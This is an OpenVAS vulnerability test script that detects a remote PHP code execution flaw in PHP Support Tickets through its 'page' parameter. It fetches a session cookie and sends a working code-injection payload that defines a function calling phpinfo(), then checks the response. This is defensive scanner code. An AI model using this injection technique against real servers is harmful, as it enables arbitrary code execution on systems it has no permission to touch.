###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_support_tickets_49567.nasl 2915 2016-03-23 10:30:25Z antu123 $
#
# PHP Support Tickets 'page' Parameter Remote PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103256");
 script_version("$Revision: 2915 $");
 script_tag(name:"last_modification", value:"$Date: 2016-03-23 11:30:25 +0100 (Wed, 23 Mar 2016) $");
 script_tag(name:"creation_date", value:"2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)");
 script_bugtraq_id(49567);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("PHP Support Tickets 'page' Parameter Remote PHP Code Execution Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49567");
 script_xref(name : "URL" , value : "http://www.phpsupporttickets.com/index.php");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if installed PHP Support Tickets is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_php_support_tickets_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : "PHP Support Tickets is prone to a vulnerability that lets remote
 attackers execute arbitrary code because the application fails to
 sanitize user-supplied input.");
 script_tag(name : "impact" , value : "Attackers can exploit this issue to execute arbitrary PHP code within
 the context of the affected webserver process.");
 script_tag(name : "affected" , value : "PHP Support Tickets 2.2 is vulnerable; other versions may also
 be affected.");

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"php_support_tickets"))exit(0);;

url = string(dir, "/index.php");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if( buf == NULL ) exit(0);

session_id = eregmatch(pattern:"Set-Cookie: PHPSESSID=([^;]+)",string:buf);
if(isnull(session_id[1]))exit(0);
sess = session_id[1];

url = string(dir, "/index.php?page=xek()%3Bfunction+PHPST_PAGENAME_XEK(){phpinfo()%3B}"); 

soc = open_sock_tcp(port);
if(!soc)exit(0);

host = get_host_name();
if( port != 80 && port != 443 )
  host += ':' + port;

req = string("GET /index.php?page=xek()%3Bfunction+PHPST_PAGENAME_XEK(){phpinfo()%3B} HTTP/1.1\r\n",
	     "Host: ",host,"\r\n",
	     "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:6.0) Gecko/20100101 Firefox/6.0\r\n",
	     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
	     "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
	     "Accept-Encoding: gzip, deflate\r\n",
	     "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
	     "DNT: 1\r\n",
	     "Connection: keep-alive\r\n",
	     "Cookie: PHPSESSID=",sess,"\r\n",
	     "\r\n");
send(socket:soc, data:req);
buf = recv(socket:soc, length:16384);
close(soc);

if("<title>phpinfo()" >< buf && "php.ini" >< buf && "PHP API" >< buf) {

  security_message(port:port);
  exit(0);

}  
     
exit(99);
